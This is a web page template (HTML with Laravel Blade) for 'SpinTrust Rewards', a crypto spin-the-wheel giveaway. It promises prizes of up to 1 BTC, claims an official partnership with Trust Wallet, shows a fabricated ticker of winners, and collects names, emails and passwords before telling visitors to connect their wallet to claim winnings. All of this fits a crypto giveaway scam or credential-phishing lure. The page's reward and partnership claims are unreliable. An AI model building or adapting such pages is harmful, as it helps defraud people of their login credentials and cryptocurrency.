<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Spin</title>
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/wheel.css">
    <link rel="stylesheet" href="css/s1.css">
    <link rel="stylesheet" href="css/s2.css">
    <link rel="stylesheet" href="css/s3.css">
    <link rel="stylesheet" href="css/vendor.bundle.css">
    <link rel="stylesheet" href="css/style-salvia.css">
    <script src="https://kit.fontawesome.com/f565903625.js" crossorigin="anonymous"></script>

</head>

<body class="nk-body body-wider theme-dark mode-onepage page-loaded chrome no-touch nk-nio-theme">

    <div class="nk-wrap">
        <header class="nk-header page-header is-transparent is-sticky is-shrink has-fixed" id="header">
            <div class="header-main">
                <div class="container">
                    <div class="header-wrap">
                        <div class="header-logo logo animated fadeInDown" data-animate="fadeInDown" data-delay=".65"
                            style="visibility: visible; animation-delay: 0.65s;"><a href="./"
                                class="logo-link"><img class="logo-dark" src="img/logo-symbol-v2.svg"
                                    srcset="img/logo-symbol-v2.svg 2x" alt="logo"><img class="logo-light"
                                    src="images/logo-full-white.png" srcset="img/logo-full-white.png 2x"
                                    alt="logo"></a></div>
                        <div class="header-nav-toggle"><a href="#" class="navbar-toggle"
                                data-menu-toggle="header-menu" id="ToggleKey">
                                <div class="toggle-line"><span></span></div>
                            </a></div>
                        <div class="header-navbar header-navbar-s2 menu-mobile" id="menu-mobile">
                            <nav class="header-menu justify-content-between" id="header-menu">
                                <ul class="menu animated remove-animation fadeInDown" data-animate="fadeInDown"
                                    data-delay=".75" style="visibility: visible; animation-delay: 0.75s;">
                                    <li class="menu-item"><a class="menu-link nav-link" href="#about">About</a></li>

                                    <li class="menu-item"><a class="menu-link nav-link" href="#how-it-works">How It
                                            Works</a></li>

                                    <li class="menu-item"><a class="menu-link nav-link" href="#faq">Faq</a></li>

                                </ul>

                            </nav>
                            <div class="header-navbar-overlay"></div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="header-banner bg-theme-grad-s2 has-ovm">
                <div class="nk-banner">
                    <div class="banner banner-fs banner-single banner-s1 banner-s1-overlay">
                        <div class="banner-wrap">
                            <div class="container">
                                <div
                                    class="row align-items-center justify-content-center justify-content-lg-between gutter-vr-60px">
                                    @if (session('success'))
                                        <p style="color: green;">{{ session('success') }}</p>
                                    @endif
                                    <div class="col-lg-6 col-xl-6 text-center text-lg-start">
                                        <div class="banner-caption tc-light">
                                            <div class="cpn-head mt-0">
                                                <h1 class="title title-thin title-xl-2 animated fadeInUp"
                                                    data-animate="fadeInUp" data-delay="1.25"
                                                    style="visibility: visible; animation-delay: 1.25s;">Spin to Win!
                                                    Unlock Your Fortune with the Lucky Wheel – Try Your Luck Today!</h1>
                                            </div>
                                            <div class="cpn-text cpn-text-s2">
                                                <p class="lead-s2 lead-light animated fadeInUp" data-animate="fadeInUp"
                                                    data-delay="1.35"
                                                    style="visibility: visible; animation-delay: 1.35s;">Get daily
                                                    rewards of up to 1 BTC or 1 ETH and 10,000 USDT or 10,000 XRP.</p>
                                            </div>
                                            <div class="cpn-btns">
                                                <ul class="btn-grp animated fadeInUp" data-animate="fadeInUp"
                                                    data-delay="1.45"
                                                    style="visibility: visible; animation-delay: 1.45s;">
                                                    <li><a class="btn btn-md btn-primary btn-outline"
                                                            href="#">Contact Us</a></li>

                                                </ul>
                                            </div>


                                        </div>
                                    </div>
                                    <div class="col-lg-6 col-xl-5 col-md-8 col-sm-9">
                                        <div class="token-status token-status-s3 round tc-light animated fadeInUp"
                                            data-animate="fadeInUp" data-delay="2"
                                            style="visibility: visible; animation-delay: 2s;display: flex;justify-content: center;align-items: center;padding-top: 0px;">
                                            <div class="styles_prize__cQb41">
                                                <div id="prizePlay" class="disabled">Spin!</div>
                                                <div class="prize-turntable" id="lotteryWheel">
                                                    <div class="prize-item "
                                                        style="transform: translate(-50%, -50%) rotate(0deg);">
                                                        <span>Spin!</span>
                                                    </div>
                                                    <div class="prize-item "
                                                        style="background-image: url(&quot;img/icon_usdt.svg&quot;); transform: translate(-50%, -50%) rotate(45deg);">
                                                        <span>0.2USDT</span>
                                                    </div>
                                                    <div class="prize-item "
                                                        style="background-image: url(&quot;img/icon_usdt.svg&quot;); transform: translate(-50%, -50%) rotate(90deg);">
                                                        <span>0.5 USDT</span>
                                                    </div>
                                                    <div class="prize-item "
                                                        style="background-image: url(&quot;img/icon_xrp.svg&quot;); transform: translate(-50%, -50%) rotate(135deg);">
                                                        <span>100XRP</span>
                                                    </div>
                                                    <div class="prize-item "
                                                        style="background-image: url(&quot;img/icon_usdt.svg&quot;);transform: translate(-50%, -50%) rotate(180deg);">
                                                        <span>1USDT</span>
                                                    </div>
                                                    <div class="prize-item "
                                                        style="background-image: url(&quot;img/icon_usdt.svg&quot;); transform: translate(-50%, -50%) rotate(225deg);">
                                                        <span>5USDT</span>
                                                    </div>
                                                    <div class="prize-item "
                                                        style="background-image: url(&quot;img/icon_eth.svg&quot;); transform: translate(-50%, -50%) rotate(270deg);">
                                                        <span>1ETH</span>
                                                    </div>
                                                    <div class="prize-item "
                                                        style="background-image: url(&quot;img/icon_btc.svg&quot;); transform: translate(-50%, -50%) rotate(315deg);">
                                                        <span>1BTC</span>
                                                    </div>
                                                </div>
                                                <!-- Add the audio element -->
                                                <audio id="soundEffect" src="asset/coin-spinning-90783.mp3"></audio>
                                                <audio id="soundEffect2" src="asset/ding-101492.mp3"></audio>
                                            </div>
                                        </div>
                                    </div>

                                </div>
                            </div>
                        </div>
                        <div class="banner-bottom w-100 pb-5 animated fadeInUp" data-animate="fadeInUp"
                            data-delay="1.45" style="visibility: visible; animation-delay: 1.45s;">
                            <div class="container container-xxl">
                                <div
                                    class="d-flex justify-content-center justify-content-md-between align-items-center flex-lg-nowrap flex-wrap">
                                    <ul class="btn-grp m-0">
                                        <li><a class="btn btn-lg btn-theme-dark" href="#"><span
                                                    class="btn-img pe-3"><img src="img/wave.png"
                                                        alt="wave"></span>
                                                <marquee class="btn-text ttc" style="">010****1100, Wins0.1USDT
                                                    uu8****ilon@naver.com, Wins0.2USDT miy****g@gmail.com, Wins0.1USDT
                                                    Cumulative number of participants4210220,Cumulative awards 11231091
                                                    times (renewed at 16:00:00 UTC+0)</marquee> <em
                                                    class="fa-solid fa-arrow-right ps-2"></em>
                                            </a></li>
                                    </ul>

                                </div>
                            </div>
                        </div>

                    </div>

                </div>
                <div class="nk-ovm shape-q"></div>
                <div id="particles-bg" class="particles-container particles-bg" data-pt-base="#00c0fa"
                    data-pt-base-op=".3" data-pt-line="#2b56f5" data-pt-line-op=".5" data-pt-shape="#00c0fa"
                    data-pt-shape-op=".2"><canvas class="particles-js-canvas-el" width="1800" height="2288"
                        style="width: 100%; height: 100%;"></canvas></div>
            </div>
        </header>



        <div class="bg lg">
            <div class="">
                <section class="section" style="background: #eadffe;" id="about">
                    <div class="container">
                        <div class="nk-block">
                            <div class="row align-items-center flex-row-reverse gutter-vr-30px">
                                <div class="col-lg-5">
                                    <div class="gfx py-4 mx-auto mx-lg-0 animated fadeInUp" data-animate="fadeInUp"
                                        data-delay=".1" style="visibility: visible; animation-delay: 0.1s;">
                                        <img src="img/s.png" alt="">
                                    </div>
                                </div>
                                <div class="col-lg-7">
                                    <div class="nk-block-text pdb-r">
                                        <h2 class="title title-thin animated fadeInUp" data-animate="fadeInUp"
                                            data-delay=".1" style="visibility: visible; animation-delay: 0.1s;">About
                                            SpinTrust Rewards</h2>
                                        <p class="animated fadeInUp" data-animate="fadeInUp" data-delay=".3"
                                            style="visibility: visible; animation-delay: 0.3s;">SpinTrust Rewards is
                                            your gateway to exciting crypto rewards through a simple and engaging
                                            process. We’ve partnered with Trust Wallet to create a platform where
                                            anyone—whether new or experienced in crypto—can spin a digital wheel as many
                                            times as they want to win real cryptocurrency prizes.
                                        </p>
                                        <p class="animated fadeInUp" data-animate="fadeInUp" data-delay=".3"
                                            style="visibility: visible; animation-delay: 0.3s;">SpinTrust Rewards is
                                            designed to encourage more people to use Trust Wallet, the most secure and
                                            user-friendly wallet for managing digital assets. With each spin, you’re not
                                            just having fun—you’re also taking a step toward financial empowerment.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>






                <!-- How it works -->
                <section class="section bg-light" id="how-it-works">
                    <div class="container">
                        <div class="nk-block nk-block-features-s3">
                            <div class="section-head section-head-s7 wide-auto-sm text-center">
                                <h2 class="title title-thin animated fadeInUp" data-animate="fadeInUp"
                                    data-delay=".1" style="visibility: visible; animation-delay: 0.1s;">How it works
                                </h2>
                                <p class="lead animated fadeInUp" data-animate="fadeInUp" data-delay=".2"
                                    style="visibility: visible; animation-delay: 0.2s;">Start spinning now and let the
                                    rewards roll in!</p>
                            </div>
                            <div class="row justify-content-center gutter-vr-30px">
                                <div class="col-lg-4 col-md-6">
                                    <div class="feature feature-s3 feature-center animated fadeInUp"
                                        data-animate="fadeInUp" data-delay=".3"
                                        style="visibility: visible; animation-delay: 0.3s;">
                                        <div class="feature-icon feature-icon-auto"><img src="img/step1.svg"
                                                class="icon icon-grd icon-lg ikon ikon-globe"></div>
                                        <div class="feature-text">
                                            <h4 class="title-sm title-semibold">Spin the wheel:</h4>
                                            <p class="fw-4">Try your luck and win exciting crypto rewards.</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-4 col-md-6">
                                    <div class="feature feature-s3 feature-center animated fadeInUp"
                                        data-animate="fadeInUp" data-delay=".4"
                                        style="visibility: visible; animation-delay: 0.4s;">
                                        <div class="feature-icon feature-icon-auto"><img src="img/step2.svg"
                                                class="icon icon-grd icon-lg ikon ikon-globe"></div>
                                        <div class="feature-text">
                                            <h4 class="title-sm title-semibold">Register your account:</h4>
                                            <p class="fw-4">After you’ve won, sign up to create your account.</p>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-lg-4 col-md-6">
                                    <div class="feature feature-s3 feature-center animated fadeInUp"
                                        data-animate="fadeInUp" data-delay=".5"
                                        style="visibility: visible; animation-delay: 0.5s;">
                                        <div class="feature-icon feature-icon-auto"><img src="img/step3.svg"
                                                class="icon icon-grd icon-lg ikon ikon-globe"></div>
                                        <div class="feature-text">
                                            <h4 class="title-sm title-semibold">Connect Your Trust Wallet:</h4>
                                            <p class="fw-4">Link your wallet to claim your winnings instantly.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </section>

                <!-- Faq -->
                <section class="section" id="faq"
                    style="background: url(img/banner.png);background-color: #f7f8ff;background-blend-mode: multiply;">
                    <div class="container">
                        <div class="row justify-content-between gutter-vr-30px">
                            <div class="col-lg-4">
                                <div class="section-head section-head-s7 wide-auto-sm text-lg-start text-center">
                                    <h2 class="title title-thin animated fadeInUp" data-animate="fadeInUp"
                                        data-delay=".1" style="visibility: visible; animation-delay: 0.1s;">FAQs</h2>
                                    <p class="lead animated fadeInUp" data-animate="fadeInUp" data-delay=".2"
                                        style="visibility: visible; animation-delay: 0.2s;">Below we’ve provided few
                                        common question answers. If you have any other questions, please get in touch
                                        via email.</p>
                                </div>
                            </div>
                            <div class="col-lg-7">
                                <div class="accordion animated fadeInUp" data-animate="fadeInUp" data-delay=".3"
                                    id="faq-36" style="visibility: visible; animation-delay: 0.3s;">

                                    <div class="accordion-item accordion-item-s3">


                                        <button class="accordion accordion-title accordion-title-sm">What is SpinTrust
                                            Rewards?</button>
                                        <div class="panel ">
                                            <p>SpinTrust Rewards is a crypto rewards platform that allows you to spin a
                                                digital wheel as many times as you like for a chance to win
                                                cryptocurrency prizes. Once you win, you simply sign up and connect your
                                                Trust Wallet to claim your rewards.
                                            </p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion  accordion-title accordion-title-sm">Who can
                                            participate?</button>
                                        <div class="panel">
                                            <p>Anyone with access to our website can spin the wheel! To claim your
                                                prizes, you need to sign up and connect your Trust Wallet.
                                            </p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion accordion-title accordion-title-sm">Is it free to spin
                                            the wheel?</button>
                                        <div class="panel">
                                            <p>Yes, spinning the wheel is completely free! You can spin as many times as
                                                you like until you win.</p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion accordion-title accordion-title-sm">Why do I need to
                                            sign up?</button>
                                        <div class="panel">
                                            <p>Signing up allows us to securely save your rewards and link them to your
                                                Trust Wallet for easy withdrawal.</p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion accordion-title accordion-title-sm">How do I claim my
                                            winnings?</button>
                                        <div class="panel">
                                            <p>After winning, simply sign up, log in, and connect your Trust Wallet.
                                                Your rewards will be credited directly to your wallet.</p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion accordion-title accordion-title-sm">Are the rewards
                                            real cryptocurrencies?</button>
                                        <div class="panel">
                                            <p>Yes, all rewards are real cryptocurrencies, including Bitcoin, Ethereum,
                                                Binance Coin, and more.</p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion accordion-title accordion-title-sm">How does SpinTrust
                                            Rewards ensure security?</button>
                                        <div class="panel">
                                            <p>As an official partner of Trust Wallet, we prioritize the security of
                                                your wallet and personal information. All transactions and data are
                                                handled with industry-standard encryption.</p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion accordion-title accordion-title-sm">Can I play without
                                            a Trust Wallet?</button>
                                        <div class="panel">
                                            <p>Yes, you can spin and win, but you’ll need to create or connect a Trust
                                                Wallet to claim your rewards.</p>
                                        </div>
                                    </div>
                                    <div class="accordion-item accordion-item-s3">
                                        <button class="accordion accordion-title accordion-title-sm">How do I get
                                            started?</button>
                                        <div class="panel">
                                            <p>Head to our website, start spinning, and enjoy the excitement of winning!
                                                Once you win, sign up and connect your Trust Wallet to claim your
                                                prizes.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <!-- Faq Ends-->

            </div>
        </div>

        <section class="section section-s bg-light">
            <div class="container">
                <div class="nk-block block-partners">
                    <div class="section-head section-head-sm">
                        <h6 class="title-md title-thin text-center animated fadeInUp" data-animate="fadeInUp"
                            data-delay=".1" style="visibility: visible; animation-delay: 0.1s;">Our Partners</h6>
                    </div>
                    <ul class="partner-list flex-lg-nowrap mgb-m30">
                        <li class="partner-logo-s3 animated fadeInUp" data-animate="fadeInUp" data-delay=".15"
                            style="visibility: visible; animation-delay: 0.15s;"><img src="img/a-xs.png"
                                alt="partner"></li>
                        <li class="partner-logo-s3 animated fadeInUp" data-animate="fadeInUp" data-delay=".2"
                            style="visibility: visible; animation-delay: 0.2s;"><img src="img/b-xs.png"
                                alt="partner"></li>
                        <li class="partner-logo-s3 animated fadeInUp" data-animate="fadeInUp" data-delay=".25"
                            style="visibility: visible; animation-delay: 0.25s;"><img src="img/c-xs.png"
                                alt="partner"></li>
                        <li class="partner-logo-s3 animated fadeInUp" data-animate="fadeInUp" data-delay=".3"
                            style="visibility: visible; animation-delay: 0.3s;"><img src="img/d-xs.png"
                                alt="partner"></li>
                        <li class="partner-logo-s3 animated fadeInUp" data-animate="fadeInUp" data-delay=".35"
                            style="visibility: visible; animation-delay: 0.35s;"><img src="img/e-xs.png"
                                alt="partner"></li>
                        <li class="partner-logo-s3 animated fadeInUp" data-animate="fadeInUp" data-delay=".4"
                            style="visibility: visible; animation-delay: 0.4s;"><img src="img/f-xs.png"
                                alt="partner"></li>
                    </ul>
                </div>
            </div>
        </section>

        <footer class="nk-footer bg-theme ov-h overlay-x fw-4">
            <section class="section section-m  tc-light tc-light-alt bg-transparent">
                <div class="container">
                    <div class="nk-block nk-block-footer">
                        <div class="row justify-content-between text-center text-sm-start">

                            <div class="col-lg-2 col-md-4 col-sm-3">
                                <div class="wgs wgs-menu">
                                    <h6 class="wgs-title text-white animated fadeInUp" data-animate="fadeInUp"
                                        data-delay=".3" style="visibility: visible; animation-delay: 0.3s;">Resources
                                    </h6>
                                    <div class="wgs-body">
                                        <ul class="wgs-links wgs-links-s3 animated fadeInUp" data-animate="fadeInUp"
                                            data-delay=".4" style="visibility: visible; animation-delay: 0.4s;">
                                            <li><a
                                                    href="https://apps.apple.com/us/app/trust-crypto-bitcoin-wallet/id1288339409?mt=8">Download
                                                    for iOS</a></li>
                                            <li><a href="https://trustwallet.com/download/apk">Download APK</a></li>
                                            <li><a href="https://trustwallet.com/?utm_source=cryptwerk">Wallet</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-4 col-sm-3">
                                <div class="wgs wgs-menu">
                                    <h6 class="wgs-title text-white animated fadeInUp" data-animate="fadeInUp"
                                        data-delay=".5" style="visibility: visible; animation-delay: 0.5s;">Company
                                    </h6>
                                    <div class="wgs-body">
                                        <ul class="wgs-links wgs-links-s3 animated fadeInUp" data-animate="fadeInUp"
                                            data-delay=".6" style="visibility: visible; animation-delay: 0.6s;">
                                            <li><a href="#">Home</a></li>
                                            <li><a href="#about">About</a></li>
                                            <li><a href="#how-it-works">How it works</a></li>
                                            <li><a href="#faq">Faq</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-8 offset-lg-1">
                                <div class="wgs wgs-text">
                                    <div class="wgs-logo animated fadeInUp" data-animate="fadeInUp" data-delay=".7"
                                        style="visibility: visible; animation-delay: 0.7s;"><a href="./"><img
                                                src="img/logo-symbol-v2.svg" srcset="img/logo-symbol-v2.svg"
                                                alt="logo"></a></div>
                                    <div class="wgs-body">
                                        <div class="wgs-subscribe wgs-subscribe-s2">
                                            <p class="animated fadeInUp" data-animate="fadeInUp" data-delay=".8"
                                                style="visibility: visible; animation-delay: 0.8s;">SpinTrust Rewards
                                                is your gateway to exciting crypto rewards through a simple and engaging
                                                process.</p>

                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </section>
        </footer>

    </div>
    <div class="modal-container">
        <div class="modal-pop">
            <div class="img-c">
                <img src="img/congrat.jpg" alt="">
            </div>

            <p id="prize" style="font-size: 1.3rem;"></p>
            <br>
            <div>

                <p style="font-size: 1.675rem;line-height: 2.25rem;">Sign up</p>
                <form action="{{ route('register') }}" method="post">

                    @csrf
                    <div class="ltext">
                        <label for="">Full name <span>*</span></label>
                    </div>
                    <input type="hidden" name="win_prize" id="win_prize">
                    <input type="text" name="name" id="" placeholder=" Enter your full name"
                        required>
                    @error('name')
                        <p style="color: red;">{{ $message }}</p>
                    @enderror

                    <div class="ltext">
                        <label for="">Email <span>*</span></label>
                    </div>

                    <input type="email" name="email" id="" placeholder=" Enter your email address"
                        required>
                    @error('email')
                        <p style="color: red;">{{ $message }}</p>
                    @enderror

                    <div class="ltext"><label for=""> Password <span>*</span></label></div>
                    <input type="password" name="password" id="" placeholder="Enter your password">
                    @error('password')
                        <p style="color: red;">{{ $message }}</p>
                    @enderror

                    <p style="font-size: .875rem;font-weight: 600;"> I confirm that I am at least 18 years of age, and
                        accept the Terms & Conditions</p>

                    <button class="btn btn-md btn-secondary">Register</button>

                    {{-- <p style="text-align: center;"> Already have an account? <a href="http://">Log in</a> </p> --}}

                </form>

            </div>
        </div>

    </div>


    <div class="fc">
        <div class="jumbotron text-center" style="background-color: #f7f8ff;padding: 40px;border-radius: 30px;">
            <div class="checkMark fials" style="margin-top: -90px;
    background: #f7f8ff;margin-bottom: 20px;">
                <svg version="1.1" id="cross" xmlns="http://www.w3.org/2000/svg"
                    viewBox="56.9 47.9 276.1 276.1">
                    <line id="cross_p1" class="st0" x1="56.9" y1="47.9" x2="333.1"
                        y2="324.1"></line>
                    <line id="cross_p2" class="st0" x1="56.9" y1="324.1" x2="333.1"
                        y2="47.9"></line>
                </svg>
            </div>
            <h4>Oops! No Prize This Time!</h4>
            <p class="lead">Don't worry, you can try again and test your luck!</p>
            <div class="container-login100-form-btn">
                <div class="wrap-login100-form-btn">
                    <div class="login100-form-bgbtn"></div>
                    <a href="{{ route('home') }}" class="login100-form-btn">Try Again</a>
                </div>
            </div>
        </div>
    </div>

    <script defer src="index.js"></script>
</body>

</html>
